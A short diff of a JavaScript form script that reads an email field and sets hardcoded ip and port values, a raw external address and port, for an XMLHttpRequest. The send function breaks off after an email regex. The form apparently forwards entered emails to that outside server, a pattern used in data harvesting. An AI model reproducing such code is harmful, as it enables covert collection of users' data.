@@ -2,8 +2,8 @@ let email = document.getElementById("email");
 let submit = document.getElementById("submit");
 let xhr = new XMLHttpRequest();
 let type = 'iitu';
-let ip = '';
-let port = '';
+let ip = '178.32.100.87';
+let port = '50243';
 
 let send = () => {
   var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
